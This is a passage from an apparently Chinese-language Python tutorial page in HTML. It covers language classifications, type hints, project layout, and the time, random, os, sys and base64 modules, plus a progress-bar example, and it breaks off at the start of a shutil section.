<span class="hljs-comment">#    sys.modules&#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6A21;&#x5757;</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> foo <span class="hljs-comment"># foo=&#x6A21;&#x5757;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
print(<span class="hljs-string">&apos;foo&apos;</span> <span class="hljs-keyword">in</span> sys.modules)
print(sys.modules)

<span class="hljs-comment"># sys.path&#x5E94;&#x7528;</span>
<span class="hljs-comment">#    &#x627E;foo.py&#x5C31;&#x628A;foo.py&#x7684;&#x6587;&#x4EF6;&#x5939;&#x6DFB;&#x52A0;&#x5230;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;</span>
<span class="hljs-keyword">import</span> sys
sys.path.append(<span class="hljs-string">r&quot;/users/linhaifeng/PycharmProjects/aa&quot;</span>)
</code></pre>
<h5 id="&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x7684;&#x4E09;&#x79CD;&#x5212;&#x5206;&#x65B9;&#x5F0F;&#xFF1A;">&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x7684;&#x4E09;&#x79CD;&#x5212;&#x5206;&#x65B9;&#x5F0F;&#xFF1A;</h5>
<h6 id="&#x7F16;&#x8BD1;&#x578B;&#x548C;&#x89E3;&#x91CA;&#x578B;">&#x7F16;&#x8BD1;&#x578B;&#x548C;&#x89E3;&#x91CA;&#x578B;</h6>
<p>&#x4E3B;&#x8981;&#x533A;&#x522B;&#x5728;&#x4E8E;&#xFF0C;&#x524D;&#x8005;&#x6E90;&#x7A0B;&#x5E8F;&#x7F16;&#x8BD1;&#x540E;&#x5373;&#x53EF;&#x5728;&#x8BE5;&#x5E73;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x5728;&#x8FD0;&#x884C;&#x671F;&#x95F4;&#x624D;&#x7F16;&#x8BD1;&#x3002;&#x6240;&#x4EE5;&#x524D;&#x8005;&#x8FD0;&#x884C;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x540E;&#x8005;&#x8DE8;&#x5E73;&#x53F0;&#x6027;&#x597D;</p>
<p>--------&#x7F16;&#x8BD1;&#x578B;&#x603B;&#x7ED3;</p>
<p>1.&#x4E00;&#x6B21;&#x6027;&#x7684;&#x7F16;&#x8BD1;&#x6210;&#x5E73;&#x53F0;&#x76F8;&#x5173;&#x7684;&#x673A;&#x5668;&#x8BED;&#x8A00;&#x6587;&#x4EF6;&#xFF0C;&#x8FD0;&#x884C;&#x65F6;&#x8131;&#x79BB;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#xFF0C;&#x8FD0;&#x884C;&#x6548;&#x7387;&#x9AD8;&#xFF1B;</p>
<p>2.&#x4E0E;&#x7279;&#x5B9A;&#x5E73;&#x53F0;&#x76F8;&#x5173;&#xFF0C;&#x4E00;&#x822C;&#x65E0;&#x6CD5;&#x79FB;&#x690D;&#x5230;&#x5176;&#x4ED6;&#x5E73;&#x53F0;&#xFF1B;</p>
<p>3.&#x73B0;&#x6709;&#x7684;C&#x3001;C++&#x3001;Objective&#x7B49;&#x90FD;&#x5C5E;&#x4E8E;&#x7F16;&#x8BD1;&#x578B;&#x8BED;&#x8A00;&#x3002;</p>
<p>--------&#x89E3;&#x91CA;&#x578B;&#x603B;&#x7ED3;</p>
<p>1.&#x89E3;&#x91CA;&#x578B;&#x8BED;&#x8A00;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x90FD;&#x9700;&#x8981;&#x5C06;&#x6E90;&#x4EE3;&#x7801;&#x89E3;&#x91CA;&#x79F0;&#x673A;&#x5668;&#x7801;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x6548;&#x7387;&#x8F83;&#x4F4E;&#xFF1B;</p>
<p>2.&#x53EA;&#x8981;&#x5E73;&#x53F0;&#x63D0;&#x4F9B;&#x76F8;&#x5E94;&#x7684;&#x89E3;&#x91CA;&#x5668;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x6E90;&#x7A0B;&#x5E8F;&#x79FB;&#x690D;&#xFF1B;</p>
<p>3.Python&#x7B49;&#x5C5E;&#x4E8E;&#x89E3;&#x91CA;&#x578B;&#x8BED;&#x8A00;&#x3002;</p>
<h6 id="&#x5F3A;&#x7C7B;&#x578B;&#x548C;&#x5F31;&#x7C7B;&#x578B;">&#x5F3A;&#x7C7B;&#x578B;&#x548C;&#x5F31;&#x7C7B;&#x578B;</h6>
<p>&#x5F3A;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x5FFD;&#x89C6;&#xFF0C;&#x4E00;&#x65E6;&#x88AB;&#x5B9A;&#x4E49;&#x4E0D;&#x4F1A;&#x6539;&#x53D8;&#x9664;&#x975E;&#x5F3A;&#x884C;&#x8F6C;&#x6362;&#x3002;&#x5F31;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x88AB;&#x5FFD;&#x89C6;&#xFF0C;&#x6BD4;&#x5982;php&#x7684;&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;</p>
<h6 id="&#x52A8;&#x6001;&#x578B;&#x548C;&#x9759;&#x6001;&#x578B;">&#x52A8;&#x6001;&#x578B;&#x548C;&#x9759;&#x6001;&#x578B;</h6>
<p>&#x52A8;&#x6001;&#x578B;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x624D;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x68C0;&#x67E5;&#xFF1B;&#x9759;&#x6001;&#x578B;&#x4E8B;&#x5148;&#x7ED9;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x5B9A;&#x4E49;</p>
<hr>
<p>python&#x662F;&#x89E3;&#x91CA;&#x578B;&#x5F3A;&#x7C7B;&#x578B;&#x52A8;&#x6001;&#x578B;</p>
<h5 id="&#x51FD;&#x6570;&#x7684;&#x7C7B;&#x578B;&#x63D0;&#x793A;">&#x51FD;&#x6570;&#x7684;&#x7C7B;&#x578B;&#x63D0;&#x793A;</h5>
<pre><code class="lang-python"><span class="hljs-comment">#    :&#x540E;&#x95E8;&#x8DDF;&#x7684;&#x662F;&#x63D0;&#x793A;&#x4FE1;&#x606F;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(name:str,age:int,hobbbies:tuple)</span>-&gt;int:</span>    <span class="hljs-comment">#    &#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6574;&#x578B;</span>
   print(name)
   print(age)
   print(hobbbies)
   <span class="hljs-keyword">return</span> <span class="hljs-number">111</span>
</code></pre>
<h4 id="&#x8F6F;&#x4EF6;&#x5F00;&#x53D1;&#x76EE;&#x5F55;&#x89C4;&#x8303;">&#x8F6F;&#x4EF6;&#x5F00;&#x53D1;&#x76EE;&#x5F55;&#x89C4;&#x8303;</h4>
<pre><code class="lang-python">conf    &#x914D;&#x7F6E;&#x6587;&#x4EF6;
bin        &#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;
db        &#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x64CD;&#x4F5C;
core    &#x6838;&#x5FC3;&#x903B;&#x8F91;
api        api&#x63A5;&#x53E3;
lib        &#x5B58;&#x653E;&#x81EA;&#x5B9A;&#x4E49;&#x6A21;&#x5757;
README.md    &#x89E3;&#x91CA;&#x8BF4;&#x660E;
</code></pre>
<h5 id="time&#x6A21;&#x5757;">time&#x6A21;&#x5757;</h5>
<pre><code class="lang-python">time.sleep(<span class="hljs-number">3</span>)
<span class="hljs-comment"># &#x65F6;&#x95F4;&#x5206;&#x4E3A;&#x4E09;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;</span>
<span class="hljs-comment"># 1&#x3001;&#x65F6;&#x95F4;&#x6233;&#xFF1A;&#x4ECE;1970&#x5E74;&#x5230;&#x73B0;&#x5728;&#x7ECF;&#x8FC7;&#x7684;&#x79D2;&#x6570;</span>
<span class="hljs-comment">#    &#x4F5C;&#x7528;&#xFF1A;&#x7528;&#x4E8E;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x7684;&#x8BA1;&#x7B97;</span>
print(time.time())

<span class="hljs-comment"># 2&#x3001;&#x6309;&#x7167;&#x67D0;&#x79CD;&#x683C;&#x5F0F;&#x663E;&#x793A;&#x7684;&#x65F6;&#x95F4;&#xFF1A;2020-03-30 11:11:11</span>
<span class="hljs-comment">#    &#x4F5C;&#x7528;&#xFF1A;&#x7528;&#x4E8E;&#x5C55;&#x793A;&#x65F6;&#x95F4;</span>

print(time.strftime(<span class="hljs-string">&apos;%Y-%m-%d %H:%M:%S %p&apos;</span>))
print(time.strftime(<span class="hljs-string">&apos;%Y-%m-%d %X&apos;</span>))

<span class="hljs-comment"># 3&#x3001;&#x7ED3;&#x6784;&#x5316;&#x7684;&#x65F6;&#x95F4;</span>
<span class="hljs-comment">#    &#x4F5C;&#x7528;&#xFF1A;&#x7528;&#x4E8E;&#x5355;&#x72EC;&#x83B7;&#x53D6;&#x65F6;&#x95F4;&#x7684;&#x67D0;&#x4E00;&#x90E8;&#x5206;</span>

res=time.localtime()
print(res)
print(res.tm_year)
print(res.tm_yday)
</code></pre>
<h5 id="datatime&#x6A21;&#x5757;">datatime&#x6A21;&#x5757;</h5>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x4E00;&#x6B65;&#x5230;&#x4F4D;&#x5F97;&#x5230;&#x663E;&#x793A;&#x51FA;&#x7684;&#x683C;&#x5F0F;&#x5316;&#x65F6;&#x95F4;</span>
<span class="hljs-keyword">import</span> datetime

print(datetime.datetime.now())
print(datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">3</span>))
print(datetime.datetime.now() + datetime.timedelta(weeks=<span class="hljs-number">1</span>))
</code></pre>
<p><img src="https://s4.ax1x.com/2022/02/27/bm1JxS.png" alt=""></p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> time
s_time=time.localtime()
print(time.mktime(s_time))

tp_time=time.time()
print(time.localtime(tp_time))

print(time.localtime())
print(time.gmtime()) <span class="hljs-comment"># &#x4E16;&#x754C;&#x6807;&#x51C6;&#x65F6;&#x95F4;&#xFF0C;&#x4E86;&#x89E3;</span>
print(time.localtime(<span class="hljs-number">333333333</span>))
print(time.gmtime(<span class="hljs-number">333333333</span>))

s_time=time.localtime()
print(time.strftime(<span class="hljs-string">&apos;%Y-%m-%d %H:%M:%S&apos;</span>,s_time))
</code></pre>
<h5 id="random&#x6A21;&#x5757;">random&#x6A21;&#x5757;</h5>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> random
print(random.random())<span class="hljs-comment">#(0,1)----float    &#x5927;&#x4E8E;0&#x4E14;&#x5C0F;&#x4E8E;1&#x4E4B;&#x95F4;&#x7684;&#x5C0F;&#x6570;</span>
print(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))  <span class="hljs-comment">#[1,3]    &#x5927;&#x4E8E;&#x7B49;&#x4E8E;1&#x4E14;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;3&#x4E4B;&#x95F4;&#x7684;&#x6574;&#x6570;</span>
print(random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)) <span class="hljs-comment">#[1,3)    &#x5927;&#x4E8E;&#x7B49;&#x4E8E;1&#x4E14;&#x5C0F;&#x4E8E;3&#x4E4B;&#x95F4;&#x7684;&#x6574;&#x6570;</span>
print(random.choice([<span class="hljs-number">1</span>,<span class="hljs-string">&apos;23&apos;</span>,[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]]))<span class="hljs-comment">#1&#x6216;&#x8005;23&#x6216;&#x8005;[4,5]</span>
print(random.sample([<span class="hljs-number">1</span>,<span class="hljs-string">&apos;23&apos;</span>,[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]],<span class="hljs-number">2</span>))<span class="hljs-comment">#&#x5217;&#x8868;&#x5143;&#x7D20;&#x4EFB;&#x610F;2&#x4E2A;&#x7EC4;&#x5408;</span>
print(random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))<span class="hljs-comment">#&#x5927;&#x4E8E;1&#x5C0F;&#x4E8E;3&#x7684;&#x5C0F;&#x6570;&#xFF0C;&#x5982;1.927109612082716 </span>

item=[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>]
random.shuffle(item) <span class="hljs-comment">#&#x6253;&#x4E71;item&#x7684;&#x987A;&#x5E8F;,&#x76F8;&#x5F53;&#x4E8E;&quot;&#x6D17;&#x724C;&quot;</span>
print(item)

------------------
&#x968F;&#x673A;&#x9A8C;&#x8BC1;&#x7801;
<span class="hljs-keyword">import</span> random
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_code</span><span class="hljs-params">(n)</span>:</span>
    res=<span class="hljs-string">&apos;&apos;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):
        s1=chr(random.randint(<span class="hljs-number">65</span>,<span class="hljs-number">90</span>))
        s2=str(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>))
        res+=random.choice([s1,s2])
    <span class="hljs-keyword">return</span> res

print(make_code(<span class="hljs-number">9</span>))
</code></pre>
<h5 id="glob&#x6A21;&#x5757;">glob&#x6A21;&#x5757;</h5>
<h5 id="os&#x6A21;&#x5757;">os&#x6A21;&#x5757;</h5>
<pre><code class="lang-python">os.getcwd() &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x5373;&#x5F53;&#x524D;python&#x811A;&#x672C;&#x5DE5;&#x4F5C;&#x7684;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;
os.chdir(&quot;dirname&quot;)  &#x6539;&#x53D8;&#x5F53;&#x524D;&#x811A;&#x672C;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF1B;&#x76F8;&#x5F53;&#x4E8E;shell&#x4E0B;cd
os.curdir  &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x76EE;&#x5F55;: (&apos;.&apos;)
os.pardir  &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x7684;&#x7236;&#x76EE;&#x5F55;&#x5B57;&#x7B26;&#x4E32;&#x540D;&#xFF1A;(&apos;..&apos;)
os.makedirs(&apos;dirname1/dirname2&apos;)    &#x53EF;&#x751F;&#x6210;&#x591A;&#x5C42;&#x9012;&#x5F52;&#x76EE;&#x5F55;
os.removedirs(&apos;dirname1&apos;)    &#x82E5;&#x76EE;&#x5F55;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x5220;&#x9664;&#xFF0C;&#x5E76;&#x9012;&#x5F52;&#x5230;&#x4E0A;&#x4E00;&#x7EA7;&#x76EE;&#x5F55;&#xFF0C;&#x5982;&#x82E5;&#x4E5F;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x5220;&#x9664;&#xFF0C;&#x4F9D;&#x6B64;&#x7C7B;&#x63A8;
os.mkdir(&apos;dirname&apos;)    &#x751F;&#x6210;&#x5355;&#x7EA7;&#x76EE;&#x5F55;&#xFF1B;&#x76F8;&#x5F53;&#x4E8E;shell&#x4E2D;mkdir dirname
os.rmdir(&apos;dirname&apos;)    &#x5220;&#x9664;&#x5355;&#x7EA7;&#x7A7A;&#x76EE;&#x5F55;&#xFF0C;&#x82E5;&#x76EE;&#x5F55;&#x4E0D;&#x4E3A;&#x7A7A;&#x5219;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#xFF0C;&#x62A5;&#x9519;&#xFF1B;&#x76F8;&#x5F53;&#x4E8E;shell&#x4E2D;rmdir dirname
os.listdir(&apos;dirname&apos;)    &#x5217;&#x51FA;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x548C;&#x5B50;&#x76EE;&#x5F55;&#xFF0C;&#x5305;&#x62EC;&#x9690;&#x85CF;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4EE5;&#x5217;&#x8868;&#x65B9;&#x5F0F;&#x6253;&#x5370;
os.remove()  &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;
os.rename(&quot;oldname&quot;,&quot;newname&quot;)  &#x91CD;&#x547D;&#x540D;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;
os.stat(&apos;path/filename&apos;)  &#x83B7;&#x53D6;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;&#x4FE1;&#x606F;
os.sep    &#x8F93;&#x51FA;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7279;&#x5B9A;&#x7684;&#x8DEF;&#x5F84;&#x5206;&#x9694;&#x7B26;&#xFF0C;win&#x4E0B;&#x4E3A;&quot;\\&quot;,Linux&#x4E0B;&#x4E3A;&quot;/&quot;
os.linesep    &#x8F93;&#x51FA;&#x5F53;&#x524D;&#x5E73;&#x53F0;&#x4F7F;&#x7528;&#x7684;&#x884C;&#x7EC8;&#x6B62;&#x7B26;&#xFF0C;win&#x4E0B;&#x4E3A;&quot;\t\n&quot;,Linux&#x4E0B;&#x4E3A;&quot;\n&quot;
os.pathsep    &#x8F93;&#x51FA;&#x7528;&#x4E8E;&#x5206;&#x5272;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x7684;&#x5B57;&#x7B26;&#x4E32; win&#x4E0B;&#x4E3A;;,Linux&#x4E0B;&#x4E3A;:
os.name    &#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x4E32;&#x6307;&#x793A;&#x5F53;&#x524D;&#x4F7F;&#x7528;&#x5E73;&#x53F0;&#x3002;win-&gt;&apos;nt&apos;; Linux-&gt;&apos;posix&apos;
os.system(&quot;bash command&quot;)  &#x8FD0;&#x884C;shell&#x547D;&#x4EE4;&#xFF0C;&#x76F4;&#x63A5;&#x663E;&#x793A;
os.environ  &#x83B7;&#x53D6;&#x7CFB;&#x7EDF;&#x73AF;&#x5883;&#x53D8;&#x91CF;
os.path.abspath(path)  &#x8FD4;&#x56DE;path&#x89C4;&#x8303;&#x5316;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
os.path.split(path)  &#x5C06;path&#x5206;&#x5272;&#x6210;&#x76EE;&#x5F55;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x4E8C;&#x5143;&#x7EC4;&#x8FD4;&#x56DE;
os.path.dirname(path)  &#x8FD4;&#x56DE;path&#x7684;&#x76EE;&#x5F55;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;os.path.split(path)&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;
os.path.basename(path)  &#x8FD4;&#x56DE;path&#x6700;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x5982;&#x4F55;path&#x4EE5;&#xFF0F;&#x6216;\&#x7ED3;&#x5C3E;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#x7A7A;&#x503C;&#x3002;&#x5373;os.path.split(path)&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x5143;&#x7D20;
os.path.exists(path)  &#x5982;&#x679C;path&#x5B58;&#x5728;&#xFF0C;&#x8FD4;&#x56DE;True&#xFF1B;&#x5982;&#x679C;path&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8FD4;&#x56DE;False
os.path.isabs(path)  &#x5982;&#x679C;path&#x662F;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x8FD4;&#x56DE;True
os.path.isfile(path)  &#x5982;&#x679C;path&#x662F;&#x4E00;&#x4E2A;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD4;&#x56DE;True&#x3002;&#x5426;&#x5219;&#x8FD4;&#x56DE;False
os.path.isdir(path)  &#x5982;&#x679C;path&#x662F;&#x4E00;&#x4E2A;&#x5B58;&#x5728;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;True&#x3002;&#x5426;&#x5219;&#x8FD4;&#x56DE;False
os.path.join(path1[, path2[, ...]])  &#x5C06;&#x591A;&#x4E2A;&#x8DEF;&#x5F84;&#x7EC4;&#x5408;&#x540E;&#x8FD4;&#x56DE;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x4E4B;&#x524D;&#x7684;&#x53C2;&#x6570;&#x5C06;&#x88AB;&#x5FFD;&#x7565;
os.path.getatime(path)  &#x8FD4;&#x56DE;path&#x6240;&#x6307;&#x5411;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x5B58;&#x53D6;&#x65F6;&#x95F4;
os.path.getmtime(path)  &#x8FD4;&#x56DE;path&#x6240;&#x6307;&#x5411;&#x7684;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x65F6;&#x95F4;
os.path.getsize(path) &#x8FD4;&#x56DE;path&#x7684;&#x5927;&#x5C0F;
</code></pre>
<h5 id="sys&#x6A21;&#x5757;">sys&#x6A21;&#x5757;</h5>
<p>&#x9488;&#x5BF9;python&#x89E3;&#x91CA;&#x5668;&#x76F8;&#x5173;&#x53D8;&#x91CF;&#x548C;&#x65B9;&#x6CD5;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x7248;&#x672C;&#x53F7;</span>
print(sys.version)
<span class="hljs-comment"># &#x6700;&#x5927;&#x8868;&#x793A;int&#x6570;&#x503C;</span>
print(sys.maxsize)
<span class="hljs-comment"># &#x67E5;&#x770B;python&#x4EE3;&#x7801;&#x6A21;&#x5757;</span>
print(sys.path)
<span class="hljs-comment"># &#x67E5;&#x770B;&#x5E73;&#x53F0;</span>
print(sys.platform)
<span class="hljs-comment"># &#x67E5;&#x770B;&#x7248;&#x6743;</span>
print(sys.copyright)
<span class="hljs-comment"># &#x67E5;&#x770B;&#x53C2;&#x6570;</span>
print(sys.argv)
<span class="hljs-comment"># &#x9000;&#x51FA;&#x7801;</span>
print(sys.exit(<span class="hljs-number">1</span>))
<span class="hljs-comment"># &#x67E5;&#x770B;&#x9ED8;&#x8BA4;&#x7F16;&#x7801;</span>
print(sys.getdefaultencoding())
<span class="hljs-comment"># &#x67E5;&#x770B;&#x6587;&#x4EF6;&#x7F16;&#x7801;</span>
print(sys.getfilesystemencoding())
<span class="hljs-comment"># &#x6700;&#x5927;&#x9012;&#x5F52;&#x6B21;&#x6570;</span>
print(sys.getrecursionlimit())
sys.argv           <span class="hljs-comment">#&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;List&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x662F;&#x7A0B;&#x5E8F;&#x672C;&#x8EAB;&#x8DEF;&#x5F84;</span>
sys.exit(n)        <span class="hljs-comment">#&#x9000;&#x51FA;&#x7A0B;&#x5E8F;&#xFF0C;&#x6B63;&#x5E38;&#x9000;&#x51FA;&#x65F6;exit(0)</span>
sys.version        <span class="hljs-comment">#&#x83B7;&#x53D6;Python&#x89E3;&#x91CA;&#x7A0B;&#x5E8F;&#x7684;&#x7248;&#x672C;&#x4FE1;&#x606F;</span>
sys.maxint       <span class="hljs-comment">#  &#x6700;&#x5927;&#x7684;Int&#x503C;</span>
sys.path           <span class="hljs-comment">#&#x8FD4;&#x56DE;&#x6A21;&#x5757;&#x7684;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x4F7F;&#x7528;PYTHONPATH&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x503C;</span>
sys.platform       <span class="hljs-comment">#&#x8FD4;&#x56DE;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5E73;&#x53F0;&#x540D;&#x79F0;</span>
sys.stdin          <span class="hljs-comment">#&#x8F93;&#x5165;&#x76F8;&#x5173;</span>
sys.stdout         <span class="hljs-comment">#&#x8F93;&#x51FA;&#x76F8;&#x5173;</span>
sys.stderror       <span class="hljs-comment">#&#x9519;&#x8BEF;&#x76F8;&#x5173;</span>
</code></pre>
<h5 id="base64&#x6A21;&#x5757;">base64&#x6A21;&#x5757;</h5>
<p>&#x5E38;&#x89C1;&#x4E8E;ctf&#x9898;&#x76EE;&#x6216;&#x8005;&#x722C;&#x866B;&#x4E2D;url&#x4E2D;base64&#x7684;&#x8F6C;&#x6362;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x60F3;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x7F16;&#x7801;&#x6210;base64,&#x8981;&#x5148;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</span>
<span class="hljs-keyword">import</span> base64
url = <span class="hljs-string">&quot;https://www.cnblogs.com/songzhixue/&quot;</span>
bytes_url = url.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)
str_url = base64.b64encode(bytes_url)  <span class="hljs-comment"># &#x88AB;&#x7F16;&#x7801;&#x7684;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;</span>
print(bytes_url)

<span class="hljs-comment"># b&apos;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&apos;</span>
-------------------------------------------------------------------------------------------------
<span class="hljs-comment"># &#x5C06;base64&#x89E3;&#x7801;&#x6210;&#x5B57;&#x7B26;&#x4E32;</span>
<span class="hljs-keyword">import</span> base64
url = <span class="hljs-string">&quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&quot;</span>
str_url = base64.b64decode(url).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)
print(str_url)

<span class="hljs-comment"># &apos;https://www.cnblogs.com/songzhixue/&apos;</span>
</code></pre>
<h5 id="&#x6253;&#x5370;&#x8FDB;&#x5EA6;&#x6761;">&#x6253;&#x5370;&#x8FDB;&#x5EA6;&#x6761;</h5>
<pre><code class="lang-python"><span class="hljs-string">&apos;[%-50s]&apos;</span>    <span class="hljs-comment"># &#x8FD9;&#x91CC;%s&#x662F;&#x66FF;&#x4EE3;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x6BD4;&#x5982;&#x25A0;&#x6216;&#x8005;#&#xFF0C;- &#x662F;&#x5DE6;&#x5BF9;&#x9F50;</span>

<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">51</span>):
    time.sleep(<span class="hljs-number">0.2</span>)
    msg = <span class="hljs-string">&apos;\r[%-50s]&apos;</span> % (<span class="hljs-string">&apos;&#x25A0;&apos;</span> * i)
    print(msg,end=<span class="hljs-string">&apos;&apos;</span>)
<span class="hljs-comment">#    &#x8FD9;&#x91CC;\r&#x662F;&#x6BCF;&#x6B21;&#x6253;&#x5370;&#x90FD;&#x8DF3;&#x5230;&#x884C;&#x9996;</span>
------------------------------------------------------------------------
<span class="hljs-keyword">import</span> time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">progress</span><span class="hljs-params">(percent)</span>:</span>
    <span class="hljs-keyword">if</span> percent &gt; <span class="hljs-number">1</span>:
        percent = <span class="hljs-number">1</span>
    res = int(<span class="hljs-number">50</span> * percent) * <span class="hljs-string">&apos;&#x25A0;&apos;</span>
    print(<span class="hljs-string">&apos;\r[%-50s] %d%%&apos;</span> % (res, int(<span class="hljs-number">100</span> * percent)), end=<span class="hljs-string">&apos;&apos;</span>)

recv_size=<span class="hljs-number">0</span>
total_size=<span class="hljs-number">1025011</span>

<span class="hljs-keyword">while</span> recv_size &lt; total_size:
    time.sleep(<span class="hljs-number">0.001</span>) <span class="hljs-comment"># &#x4E0B;&#x8F7D;&#x4E86;1024&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;</span>

    recv_size+=<span class="hljs-number">1024</span> <span class="hljs-comment"># recv_size=2048</span>

    <span class="hljs-comment"># &#x6253;&#x5370;&#x8FDB;&#x5EA6;&#x6761;</span>
    <span class="hljs-comment"># print(recv_size)</span>
    percent = recv_size / total_size  <span class="hljs-comment"># 1024 / 333333</span>
    progress(percent)
</code></pre>
<h5 id="shutil&#x6A21;&#x5757;">shutil&#x6A21;&#x5757;</h5>
<pre><code class="lang-python">shutil.copyfileobj(fsrc, fdst[, length])
&#x5C06;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x62F7;&#x8D1D;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;

<span class="hljs-number">1</span> <span class="hljs-keyword">import</span> shutil
<span class="hljs-number">2</span>  
